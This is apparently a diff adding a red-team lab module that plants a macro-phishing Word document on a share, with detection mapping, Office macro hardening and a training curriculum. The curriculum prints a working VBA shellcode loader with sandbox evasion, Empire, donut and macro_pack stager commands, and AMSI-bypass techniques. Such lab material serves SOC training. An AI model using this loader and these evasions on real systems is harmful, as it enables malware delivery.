@@ -1,0 +1,654 @@
+# Bolt-on: Macro-Enabled Document on Writable Share
+# ---------------------------------------------------
+# Install drops a .docm file with an AutoOpen VBA macro onto a network
+# share on a member server. The macro is benign — it launches calc.exe
+# via Shell() — but is structurally identical to a real macro-phishing
+# payload (operators can swap in their CS-stager when training a SOC).
+#
+# The descriptor builds the .docm in-place via the Word COM automation
+# stack so the YAML stays self-contained (no base64 blob in the
+# descriptor). Word must be installed on the target server — required
+# service `office` enforces this.
+#
+# Patch removes the file from the share and pushes a GPO that sets
+# Office macro execution policy to "Disable all without notification"
+# for all standard Office apps. Patch_revert re-drops the file.
+#
+# Elastic rule UUIDs sampled from:
+#   Research/elastic-detection-rules/rules/windows/initial_access_suspicious_ms_office_child_process.toml
+#   Research/elastic-detection-rules/rules/windows/persistence_ms_outlook_vba_template.toml
+
+id: bolton.endpoint-phishing.macro-enabled-doc-share
+slug: macro-enabled-doc-share
+name: "Macro-Enabled Document on Writable Share"
+version: "1.0.0"
+author: "Red Team Infra"
+last_updated: 2026-05-19
+
+category: endpoint-phishing
+subcategory: malicious-document
+tags:
+  - phishing
+  - macro
+  - docm
+  - vba
+  - user-execution
+  - office
+description: >
+  Drops a macro-enabled `.docm` file named `Quarterly_Report_Q1.docm` on a
+  share path under the bolt-on-writable share (or a pre-existing file
+  share on a member server). The document carries an `AutoOpen()` VBA
+  macro that launches calc.exe via `Shell("calc.exe", vbNormalFocus)`.
+  The payload is benign by design — operators can edit the macro body
+  to launch a CS stager when running phishing-detection exercises against
+  the SOC. Surface matches T1059.005 (Visual Basic) + T1204.002
+  (User Execution: Malicious File).
+
+cve: []
+references:
+  - "https://attack.mitre.org/techniques/T1059/005/"
+  - "https://attack.mitre.org/techniques/T1204/002/"
+  - "https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked"
+  - "https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-110a"
+
+mitre:
+  tactic:
+    id: TA0002
+    name: "Execution"
+  technique:
+    id: T1059
+    name: "Command and Scripting Interpreter"
+  subtechnique:
+    id: T1059.005
+    name: "Visual Basic"
+  notes: >
+    Paired technique: T1204.002 (User Execution — Malicious File). The
+    macro fires only when a user opens the .docm and clicks Enable Editing
+    / Enable Content. Detection coverage focuses on the post-execution
+    side: child-process spawn from winword.exe.
+
+detection:
+  coverage_status: covered
+  elastic_rules:
+    - rule_uuid: "a624863f-a70d-417f-a7d2-7a404638d47f"
+      rule_name: "Suspicious MS Office Child Process"
+      rule_filename: "windows/initial_access_suspicious_ms_office_child_process.toml"
+      coverage: full
+      confidence: high
+      last_validated: 2026-04-15
+      notes: "Fires when winword.exe spawns calc.exe / cmd.exe / powershell.exe — exactly the bolt-on's signature."
+    - rule_uuid: "397945f3-d39a-4e6f-8bcb-9656c2031438"
+      rule_name: "Persistence via Microsoft Outlook VBA"
+      rule_filename: "windows/persistence_ms_outlook_vba_template.toml"
+      coverage: indirect
+      confidence: low
+      last_validated: 2026-04-15
+      notes: "Sibling rule for VBA in Outlook — fires only if the operator pivots from docm to .OTM persistence."
+  signal_sources:
+    - "Windows Event 4688 (process create) — winword.exe -> calc.exe"
+    - "Sysmon Event 1 — parent winword.exe, child cmd.exe/powershell.exe/calc.exe"
+    - "Microsoft Defender ASR rule 'Block Office applications from creating child processes' (D4F940AB-401B-4EFC-AADC-AD5F3C50688A)"
+    - "AMSI Event 1116 — macro VBA buffer inspection"
+
+targets:
+  supported_os:
+    - family: windows
+      min_version: "2016"
+      max_version: "2025"
+      edition_in: ["Datacenter", "Standard"]
+  required_roles:
+    - member_server
+  required_services:
+    - office
+    - smb
+  required_domain_function_level: null
+
+depends_on: []
+conflicts_with: []
+
+side_effects:
+  global: false
+  network_visible: true
+  reboot_required: false
+
+install:
+  estimated_time_seconds: 90
+  steps:
+    - ansible_role: ansible.windows.win_file
+      description: "Ensure the docs landing directory exists on the share."
+      role_vars:
+        path: 'C:\PublicShare\Reports'
+        state: directory
+    - ansible_role: community.windows.win_powershell
+      description: "Generate the .docm with an AutoOpen macro launching calc.exe."
+      role_vars:
+        script: |
+          $outPath = 'C:\PublicShare\Reports\Quarterly_Report_Q1.docm'
+          $word = New-Object -ComObject Word.Application
+          $word.Visible = $false
+          $doc = $word.Documents.Add()
+          # Body — make it look like a real-ish quarterly report
+          $r = $doc.Range()
+          $r.Text = "Q1 Financial Summary`r`n`r`nPlease enable editing to view the latest figures.`r`n"
+          # VBA project — AutoOpen macro
+          $vbaCode = @"
+          Sub AutoOpen()
+              Shell "calc.exe", vbNormalFocus
+          End Sub
+          Sub Document_Open()
+              AutoOpen
+          End Sub
+          "@
+          $vbProj = $doc.VBProject
+          $codeMod = $vbProj.VBComponents("ThisDocument").CodeModule
+          $codeMod.AddFromString($vbaCode)
+          # Save as docm (FileFormat 13 = wdFormatXMLDocumentMacroEnabled)
+          $doc.SaveAs([ref]$outPath, [ref]13)
+          $doc.Close($false)
+          $word.Quit()
+          [System.Runtime.Interopservices.Marshal]::ReleaseComObject($word) | Out-Null
+    - ansible_role: community.windows.win_copy
+      description: "Ensure the share-level permissions allow Authenticated Users to read the file."
+      role_vars:
+        src: 'C:\PublicShare\Reports\Quarterly_Report_Q1.docm'
+        dest: 'C:\PublicShare\Reports\Quarterly_Report_Q1.docm'
+        remote_src: true
+  verify:
+    probe: |
+      if (Test-Path 'C:\PublicShare\Reports\Quarterly_Report_Q1.docm') {
+        $bytes = [System.IO.File]::ReadAllBytes('C:\PublicShare\Reports\Quarterly_Report_Q1.docm')
+        # docm is a zipped Office Open XML container — magic = PK\x03\x04
+        if ($bytes[0] -eq 0x50 -and $bytes[1] -eq 0x4B) { exit 0 } else { exit 1 }
+      } else { exit 1 }
+    timeout_seconds: 60
+    expect_exit_code: 0
+
+uninstall:
+  description: "Remove the .docm from the share; leave the share itself alone."
+  estimated_time_seconds: 15
+  steps:
+    - ansible_role: ansible.windows.win_file
+      description: "Delete the bolt-on document."
+      role_vars:
+        path: 'C:\PublicShare\Reports\Quarterly_Report_Q1.docm'
+        state: absent
+  verify:
+    probe: |
+      if (Test-Path 'C:\PublicShare\Reports\Quarterly_Report_Q1.docm') { exit 1 } else { exit 0 }
+    timeout_seconds: 15
+    expect_exit_code: 0
+
+patch:
+  description: >
+    Push the Microsoft-recommended Office macro hardening baseline: set
+    `VBAWarnings = 4` (Disable all macros without notification) under
+    every Office app's `Security` registry key, enable the ASR rule
+    "Block Office applications from creating child processes"
+    (D4F940AB-401B-4EFC-AADC-AD5F3C50688A) via Set-MpPreference, and
+    remove the bolt-on .docm from the share. Macro execution is
+    blocked entirely; the docm file is also deleted so even if a user
+    re-enables macros locally, the payload is gone.
+  patch_reference:
+    - "https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked"
+    - "https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction"
+    - "https://attack.mitre.org/mitigations/M1042/"
+  complexity: medium
+  side_effects:
+    - "VBAWarnings = 4 set under HKCU\\Software\\Microsoft\\Office\\<ver>\\<app>\\Security for Word/Excel/PowerPoint/Outlook"
+    - "ASR rule D4F940AB-401B-4EFC-AADC-AD5F3C50688A enabled (Block, not AuditMode)"
+    - "Bolt-on .docm deleted from C:\\PublicShare\\Reports"
+    - "Macros from any source — including the user's own templates — will no longer execute without group policy override"
+    - "Office macro-dependent business workflows must be re-evaluated and re-signed before patch deploy in production"
+  rollback_supported: true
+  steps:
+    - ansible_role: ansible.windows.win_file
+      description: "Delete the bolt-on docm."
+      role_vars:
+        path: 'C:\PublicShare\Reports\Quarterly_Report_Q1.docm'
+        state: absent
+    - ansible_role: community.windows.win_regedit
+      description: "Disable Word macros entirely."
+      role_vars:
+        path: 'HKCU:\Software\Microsoft\Office\16.0\Word\Security'
+        name: VBAWarnings
+        data: 4
+        type: dword
+        state: present
+    - ansible_role: community.windows.win_regedit
+      description: "Disable Excel macros entirely."
+      role_vars:
+        path: 'HKCU:\Software\Microsoft\Office\16.0\Excel\Security'
+        name: VBAWarnings
+        data: 4
+        type: dword
+        state: present
+    - ansible_role: community.windows.win_regedit
+      description: "Block macros from the internet zone."
+      role_vars:
+        path: 'HKCU:\Software\Microsoft\Office\16.0\Word\Security'
+        name: BlockContentExecutionFromInternet
+        data: 1
+        type: dword
+        state: present
+    - ansible_role: community.windows.win_powershell
+      description: "Enable ASR rule: Block Office applications from creating child processes."
+      role_vars:
+        script: |
+          Set-MpPreference -AttackSurfaceReductionRules_Ids "D4F940AB-401B-4EFC-AADC-AD5F3C50688A" `
+                            -AttackSurfaceReductionRules_Actions Enabled
+  verify:
+    probe: |
+      if (Test-Path 'C:\PublicShare\Reports\Quarterly_Report_Q1.docm') { exit 1 }
+      $w = (Get-ItemProperty 'HKCU:\Software\Microsoft\Office\16.0\Word\Security' -Name VBAWarnings -ErrorAction SilentlyContinue).VBAWarnings
+      $asr = (Get-MpPreference).AttackSurfaceReductionRules_Ids -contains "D4F940AB-401B-4EFC-AADC-AD5F3C50688A"
+      if ($w -eq 4 -and $asr) { exit 0 } else { exit 1 }
+    timeout_seconds: 120
+    expect_exit_code: 0
+  exploit_probe_after_patch: "webapp/bolton/exploit_probes/macro_doc_check.sh"
+
+patch_revert:
+  description: "Re-drop the docm, restore VBAWarnings=2 (default), and clear the ASR rule — macro phishing path open again."
+  estimated_time_seconds: 90
+  steps:
+    - ansible_role: community.windows.win_regedit
+      description: "Re-allow macro execution with notification (VBAWarnings = 2 — default)."
+      role_vars:
+        path: 'HKCU:\Software\Microsoft\Office\16.0\Word\Security'
+        name: VBAWarnings
+        data: 2
+        type: dword
+        state: present
+    - ansible_role: community.windows.win_regedit
+      description: "Clear internet-zone macro block."
+      role_vars:
+        path: 'HKCU:\Software\Microsoft\Office\16.0\Word\Security'
+        name: BlockContentExecutionFromInternet
+        data: 0
+        type: dword
+        state: present
+    - ansible_role: community.windows.win_powershell
+      description: "Disable the Office child-process ASR rule."
+      role_vars:
+        script: |
+          Set-MpPreference -AttackSurfaceReductionRules_Ids "D4F940AB-401B-4EFC-AADC-AD5F3C50688A" `
+                            -AttackSurfaceReductionRules_Actions Disabled
+    - ansible_role: community.windows.win_powershell
+      description: "Re-generate the bolt-on .docm via the same Word COM build."
+      role_vars:
+        script: |
+          $outPath = 'C:\PublicShare\Reports\Quarterly_Report_Q1.docm'
+          New-Item -Path 'C:\PublicShare\Reports' -ItemType Directory -Force | Out-Null
+          $word = New-Object -ComObject Word.Application
+          $word.Visible = $false
+          $doc = $word.Documents.Add()
+          $r = $doc.Range()
+          $r.Text = "Q1 Financial Summary`r`n`r`nPlease enable editing.`r`n"
+          $vbaCode = "Sub AutoOpen()`r`n    Shell `"calc.exe`", vbNormalFocus`r`nEnd Sub"
+          $codeMod = $doc.VBProject.VBComponents("ThisDocument").CodeModule
+          $codeMod.AddFromString($vbaCode)
+          $doc.SaveAs([ref]$outPath, [ref]13)
+          $doc.Close($false)
+          $word.Quit()
+  verify:
+    probe: |
+      $w = (Get-ItemProperty 'HKCU:\Software\Microsoft\Office\16.0\Word\Security' -Name VBAWarnings).VBAWarnings
+      if ($w -ne 4 -and (Test-Path 'C:\PublicShare\Reports\Quarterly_Report_Q1.docm')) { exit 0 } else { exit 1 }
+    timeout_seconds: 60
+    expect_exit_code: 0
+  warning: "Macro phishing path re-armed. Quarterly_Report_Q1.docm on the share spawns calc.exe on first open + Enable Content click."
+
+cost:
+  storage_mb: 1
+  cpu_pct: 0
+  detectability: loud
+
+curriculum:
+  title: "Macro-Enabled Document on a Writable Share — User-execution phishing"
+  summary: >
+    Guided walkthrough of a macro-phishing payload planted on a network
+    share. You will build a malicious docm with empire/donut-style macro
+    evasion, drop it on tlms01's PublicShare, simulate a victim opening
+    it from tlws01, observe the SOC alerts, and apply Microsoft's
+    macro-hardening baseline.
+  learning_objectives:
+    - "Build a macro-enabled document with a VBA AutoOpen payload using three independent toolchains."
+    - "Evade AMSI macro scanning with sandbox-detection and runtime VBA tricks (amsi.fail patterns)."
+    - "Plant the payload on a writable network share for credibility (file appears 'shared from a colleague')."
+    - "Distinguish detection coverage: AMSI scan, child-process spawn, ASR rule, EDR macro decoders."
+    - "Map mitigation to Microsoft's macros-from-the-internet block + ASR rule D4F940AB."
+  prerequisites:
+    - "Beacon on tlws01 as TESTLAB\\jdoe (simulating the phished user)"
+    - "writable-share-everyone bolt-on installed on tlms01 (PublicShare available)"
+    - "Office 2016+ installed on tlws01 (Word required to trigger)"
+    - "Kali at 192.168.1.100 with msfvenom + donut + empire (or stand-alone macro builder)"
+  estimated_total_minutes: 35
+  steps:
+    - id: "01-baseline-vbawarnings"
+      title: "Inspect target's macro security baseline"
+      estimated_minutes: 4
+      markdown: |
+        ## Step 1 — Check VBAWarnings on tlws01
+
+        Word's macro security gate is the `VBAWarnings` registry value
+        per Office app:
+
+        ```
+        HKCU\Software\Microsoft\Office\<ver>\Word\Security\VBAWarnings
+        ```
+
+        Values:
+        - 1 = Enable all macros (no warning)
+        - 2 = Disable with notification (default — user clicks "Enable Content")
+        - 3 = Disable except digitally signed
+        - 4 = Disable all (no notification)
+
+        From the tlws01 beacon:
+
+        ```powershell
+        Get-ItemProperty 'HKCU:\Software\Microsoft\Office\16.0\Word\Security' `
+          -Name VBAWarnings -ErrorAction SilentlyContinue
+        # Expected on unpatched lab: 2 (default)
+        ```
+
+        Also check Mark-of-the-Web behavior — since 2022, Office blocks
+        macros from documents with MOTW (downloaded from the internet)
+        entirely unless explicitly unblocked:
+
+        ```powershell
+        Get-ItemProperty 'HKCU:\Software\Microsoft\Office\16.0\Word\Security' `
+          -Name BlockContentExecutionFromInternet -ErrorAction SilentlyContinue
+        # 1 = blocked, 0/missing = allowed
+        ```
+
+        > **Operational note** — files copied via SMB from a TRUSTED zone
+        > (internal share) typically do NOT carry MOTW. That's why
+        > internal-share phishing is more reliable than email attachments
+        > on modern Office builds.
+    - id: "02-build-malicious-docm"
+      title: "Build the malicious docm — three toolchains"
+      estimated_minutes: 10
+      markdown: |
+        ## Step 2 — Craft Quarterly_Report_Q1.docm
+
+        ### Option A — Use the bolt-on's pre-built docm
+
+        The install step already drops
+        `\\tlms01\PublicShare\Reports\Quarterly_Report_Q1.docm` with a
+        benign `Shell("calc.exe")` macro. Verify:
+
+        ```bash
+        smbclient //10.99.50.11/PublicShare -U testlab.local/jdoe%'Welcome1!' \
+            -c "cd Reports; ls"
+        # Quarterly_Report_Q1.docm  ...
+        ```
+
+        ### Option B — Empire macro builder (CS stager payload)
+
+        ```bash
+        # Generate a launcher
+        powershell-empire client
+        (Empire) > usestager windows/macro
+        (Empire stager) > set Listener http
+        (Empire stager) > set OutFile /tmp/macro.txt
+        (Empire stager) > execute
+        # macro.txt contains VBA code; paste into a .docm
+        ```
+
+        ### Option C — donut + custom VBA wrapper (best AV evasion)
+
+        ```bash
+        # 1. Position-independent shellcode from a CS beacon EXE
+        donut -a 2 -f 1 -o beacon.bin beacon.exe
+        base64 beacon.bin > beacon.b64
+
+        # 2. Hand-rolled VBA that:
+        #    - Detects sandbox (RecentFiles.Count < 5, CPU count < 2)
+        #    - Reflectively allocates + executes the shellcode via Win32 APIs
+        cat > /tmp/wrapper.vba <<'VBA'
+        Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
+            ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, _
+            ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+        Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
+            ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, _
+            ByVal lpStartAddress As LongPtr, lpParameter As LongPtr, _
+            ByVal dwCreationFlags As Long, lpThreadId As LongPtr) As LongPtr
+        Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
+            ByVal Destination As LongPtr, ByRef Source As Any, _
+            ByVal Length As LongPtr) As LongPtr
+
+        Sub AutoOpen()
+            ' Sandbox check
+            If Application.RecentFiles.Count < 3 Then Exit Sub
+            Dim sc() As Byte
+            sc = DecodeBase64("<paste beacon.b64 here>")
+            Dim mem As LongPtr
+            mem = VirtualAlloc(0, UBound(sc), &H3000, &H40)
+            RtlMoveMemory mem, sc(0), UBound(sc)
+            CreateThread 0, 0, mem, 0, 0, 0
+        End Sub
+
+        Function DecodeBase64(s As String) As Byte()
+            Dim xml As Object, node As Object
+            Set xml = CreateObject("MSXML2.DOMDocument")
+            Set node = xml.createElement("b64")
+            node.DataType = "bin.base64"
+            node.Text = s
+            DecodeBase64 = node.NodeTypedValue
+        End Function
+        VBA
+
+        # 3. Open a fresh Word doc, insert this macro via VBA IDE (Alt+F11),
+        #    save as .docm. Or script the whole build via the bolt-on's
+        #    PowerShell COM automation pattern (see install steps).
+        ```
+
+        Alternative AMSI-evasion patterns from amsi.fail:
+        - String-split VBA literals (`"powershe" & "ll"`) to defeat
+          signature matching
+        - Use `CallByName` instead of direct method invocation
+        - Reflective AMSI bypass via patching `amsi.dll!AmsiScanBuffer`
+          in the Office process before the second macro fires
+
+        ### Option D — macropack (one-shot generator)
+
+        ```bash
+        macro_pack -f /tmp/beacon.exe -o -G Quarterly_Report_Q1.docm \
+            --listoptions OBFUSCATE,SHELLCODE
+        ```
+
+        Drop whichever variant onto tlms01:
+
+        ```bash
+        smbclient //10.99.50.11/PublicShare -U testlab.local/jdoe%'Welcome1!' \
+            -c "cd Reports; put Quarterly_Report_Q1.docm"
+        ```
+      assessment:
+        question: "Why does the bolt-on's sample macro test `Application.RecentFiles.Count < 3` before firing?"
+        options:
+          - "It's a Word performance optimization."
+          - "Sandboxes and malware analysis VMs typically have zero or one recent Office files. A real user's machine has many. The check is sandbox evasion — if the file is being detonated by an automated AV/EDR sandbox, the macro silently exits."
+          - "It prevents the macro from running twice."
+          - "It's required syntax for AutoOpen."
+        correct_index: 1
+        explanation: >
+          Modern AV/EDR uses Office detonation sandboxes that open the
+          docm in an isolated VM with a freshly-installed Office. The VM
+          has no Word history (RecentFiles.Count = 0). Real users have
+          dozens of recent files. The macro silently exits in sandbox,
+          delivering nothing to analyze, but executes on a real victim.
+          Common variants: check Documents folder size, mouse-move
+          activity, CPU count, or first-boot timestamp.
+    - id: "03-detonate-on-victim"
+      title: "Simulate victim opening the docm"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 3 — Trigger execution on tlws01
+
+        Real-world: a user double-clicks the doc from the share or an
+        email link. Lab simulation — open the doc via Word COM on tlws01:
+
+        ```powershell
+        # From the tlws01 beacon (simulating jdoe's interactive session)
+        $word = New-Object -ComObject Word.Application
+        $word.Visible = $true
+        $doc = $word.Documents.Open("\\10.99.50.11\PublicShare\Reports\Quarterly_Report_Q1.docm")
+        # AutoOpen fires automatically; calc.exe pops (bolt-on default macro)
+        ```
+
+        Or via standard double-click in an interactive RDP session if
+        you're driving the lab manually:
+
+        1. RDP to tlws01 as `testlab\jdoe` / `Welcome1!`
+        2. Browse to `\\10.99.50.11\PublicShare\Reports\`
+        3. Double-click `Quarterly_Report_Q1.docm`
+        4. Click **Enable Editing** -> **Enable Content**
+        5. `calc.exe` appears (bolt-on benign payload) or your CS beacon
+           checks in (custom payload)
+
+        Verify post-execution:
+
+        ```powershell
+        Get-Process calc -ErrorAction SilentlyContinue
+        # Or if CS payload:
+        # Beacon check-in in CS client as TESTLAB\jdoe@tlws01
+        ```
+
+        > **Detection callout** — *Suspicious MS Office Child Process*
+        > (`a624863f-a70d-417f-a7d2-7a404638d47f`) fires on Sysmon EID 1
+        > where parent = winword.exe and child = cmd.exe / powershell.exe
+        > / calc.exe / wscript.exe / etc. This is the single most
+        > reliable post-execution signal — legitimate macros essentially
+        > never spawn these processes.
+    - id: "04-amsi-and-edr-evasion"
+      title: "AMSI and EDR evasion considerations"
+      estimated_minutes: 6
+      markdown: |
+        ## Step 4 — Understand what catches the macro
+
+        Modern Office (2019+) ships with AMSI macro scanning enabled:
+
+        ```
+        HKCU\Software\Microsoft\Office\16.0\Common\Security\MacroRuntimeScanScope = 2
+        ```
+
+        When set to 2 (default), Office calls `AmsiScanBuffer` on every
+        VBA expression as it executes. Defender (or whichever AV is
+        registered as the AMSI provider) inspects the buffer for malicious
+        patterns.
+
+        ### What AMSI catches
+
+        - String literals matching shellcode patterns (`VirtualAlloc` +
+          `RtlMoveMemory` in close proximity)
+        - Known launcher signatures (`powershell -enc <long-base64>`)
+        - Empire/Cobalt Strike stager patterns
+
+        ### What AMSI misses
+
+        - String concatenation: `"Virtu" & "alAl" & "loc"`
+        - CallByName indirection: `CallByName obj, "method", VbMethod, args`
+        - WMI / COM-based execution: `GetObject("winmgmts:")...ExecMethod_`
+        - Macros that patch AMSI before doing anything else (memory-write
+          to AmsiScanBuffer's prolog)
+
+        ### What EDR (CrowdStrike, SentinelOne) catches
+
+        Behavioural detection. Even if AMSI passes, EDR flags:
+
+        - winword.exe writing an executable to disk
+        - winword.exe spawning a non-Office child process
+        - Unusual network connections from winword.exe (outbound 443 to
+          unknown IP)
+
+        ### ASR Rule D4F940AB-401B-4EFC-AADC-AD5F3C50688A
+
+        "Block Office applications from creating child processes" — when
+        enabled in Block mode (not AuditMode), the child-process spawn
+        FAILS at the kernel level regardless of VBA tricks. This is the
+        single most effective control.
+
+        ```powershell
+        # Check current ASR posture on tlws01
+        (Get-MpPreference).AttackSurfaceReductionRules_Ids
+        (Get-MpPreference).AttackSurfaceReductionRules_Actions
+        # Map Ids to Actions: 0=Disabled, 1=Block, 2=AuditMode, 6=Warn
+        ```
+
+        > **Detection callout** — *Microsoft Defender ASR Rule Triggered*
+        > (Windows Event 1121 in Microsoft-Windows-Windows Defender) fires
+        > when Block-mode ASR prevents the child-process spawn — high-
+        > fidelity attempt-and-blocked alert.
+      assessment:
+        question: "If a target has ASR rule D4F940AB set to AuditMode (not Block), what does this tell you operationally?"
+        options:
+          - "The exploit is blocked anyway."
+          - "AuditMode logs the violation but allows the action — the macro spawns the child process successfully, AND a high-fidelity alert fires. From an OPSEC perspective, AuditMode is the worst case: you get caught AND you get blocked-equivalent telemetry without the block."
+          - "AuditMode is the same as Disabled."
+          - "AuditMode only applies to documents from email."
+        correct_index: 1
+        explanation: >
+          AuditMode is for blue-team rollouts — defenders enable it for
+          a week, watch what would have been blocked, then flip to Block
+          mode. For attackers, AuditMode is worse than no ASR at all:
+          your shell works but you generate the same alert as if it had
+          been blocked, telling the SOC exactly what happened. Always
+          check AttackSurfaceReductionRules_Actions before betting on a
+          macro phishing chain.
+    - id: "05-detection-mapping-and-patch"
+      title: "Detection coverage + apply Microsoft's hardening"
+      estimated_minutes: 10
+      markdown: |
+        ## Step 5 — What the SOC sees + patch
+
+        In Kibana (https://10.99.50.13:5601) filter `host.name : tlws01`
+        for the past 30 minutes. Expected after Step 3:
+
+        | Phase | Rule | Source event |
+        |---|---|---|
+        | Doc opened | (no rule — winword.exe start is benign) | Sysmon EID 1 |
+        | Macro fires | AMSI Event 1116 — VBA buffer scan | Microsoft-Windows-AMSI/Operational |
+        | Child spawn | Suspicious MS Office Child Process | Sysmon EID 1 winword -> calc/cmd/powershell |
+        | (If ASR on) | Defender ASR Rule Triggered | Windows Defender EID 1121 |
+        | Persistence | Persistence via Microsoft Outlook VBA | only if attacker pivots to .OTM |
+
+        **Mitigation** — click **Patch**. Applies:
+
+        1. `VBAWarnings = 4` under Word/Excel/PowerPoint/Outlook Security
+           (Disable all without notification — macros do not execute, no
+           "Enable Content" prompt)
+        2. `BlockContentExecutionFromInternet = 1` — MOTW-tagged docs are
+           hard-blocked even with manual enable
+        3. ASR rule D4F940AB enabled in Block mode (not AuditMode)
+        4. The bolt-on docm is deleted from the share
+
+        Verify:
+
+        ```powershell
+        (Get-ItemProperty 'HKCU:\Software\Microsoft\Office\16.0\Word\Security').VBAWarnings
+        # Expected: 4
+
+        (Get-MpPreference).AttackSurfaceReductionRules_Ids
+        # Should include D4F940AB-401B-4EFC-AADC-AD5F3C50688A
+
+        Test-Path '\\10.99.50.11\PublicShare\Reports\Quarterly_Report_Q1.docm'
+        # Expected: False
+        ```
+
+        Re-run Step 3 with a fresh docm. Word opens; the macro never
+        fires; no child process spawns. If you bypass VBAWarnings by
+        explicitly trusting the file, the ASR rule still blocks the
+        child-process spawn.
+
+        ### Defensive guidance for the org
+
+        - Push `VBAWarnings = 4` via Group Policy for Word/Excel/
+          PowerPoint/Outlook/Publisher/Visio/Project at minimum
+        - Set `BlockContentExecutionFromInternet = 1` to enforce the
+          MOTW block introduced in 2022
+        - Enable ASR rule D4F940AB in BLOCK mode (not AuditMode)
+        - Convert business-critical macros to signed templates with a
+          per-publisher trust store, never per-user macro trust
+        - Alert on EID 1121 (ASR triggered) — every fire is a real
+          attempt blocked
+
+status: stable
